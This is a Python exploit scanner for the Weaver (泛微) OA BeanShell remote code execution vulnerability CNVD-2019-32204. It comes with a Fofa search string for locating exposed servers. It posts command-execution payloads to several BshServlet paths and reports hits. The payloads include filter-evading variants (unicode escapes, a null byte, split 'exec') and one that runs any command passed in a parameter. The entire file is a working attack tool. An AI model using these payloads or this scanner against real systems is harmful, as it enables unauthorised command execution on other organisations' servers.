# -*- coding: utf-8 -*-
# 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
# Fofa:  app="泛微-协同办公OA"

import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def main(target):
    if target[:4] != 'http':
        target = 'http://' + target
    if target[-1] != '/':
        target += '/'

    Url_Payload1 = "/bsh.servlet.BshServlet"
    Url_Payload2 = "/weaver/bsh.servlet.BshServlet"
    Url_Payload3 = "/weaveroa/bsh.servlet.BshServlet"
    Url_Payload4 = "/oa/bsh.servlet.BshServlet"

    Data_Payload1 = """bsh.script=exec("whoami");&bsh.servlet.output=raw"""
    Data_Payload2 = """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
    Data_Payload3 = """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""

    print(now_time() + " [INFO]     正在检测Beanshell RCE漏洞")
    requests.packages.urllib3.disable_warnings()
    for Url_Payload in (Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4):
        url = target + Url_Payload
        for Data_payload in (Data_Payload1, Data_Payload2, Data_Payload3):
            try:
                http_response = requests.post(url, data=Data_payload, headers=headers, verify=False)
                if http_response.status_code == 200:
                    if ";</script>" not in http_response.content:
                        if "Login.jsp" not in http_response.content:
                            if "Error" not in http_response.content:
                                print(now_time() + " [SUCCESS]     存在Beanshell RCE漏洞: {}".format(url))
                                print(now_time() + " [INFO]     可Post手动传值测试: {}".format(Data_payload))
                elif http_response.status_code == 500:
                    print(now_time() + " [WARNING]    maybe is Weaver-EcologyOA，Please confirm by yourself:{}".format(
                        url))

            except:
                print(now_time() + " [ERROR]    目标请求失败 ")
    else:
        print(now_time() + " [WARNING]  不存在Beanshell RCE漏洞")
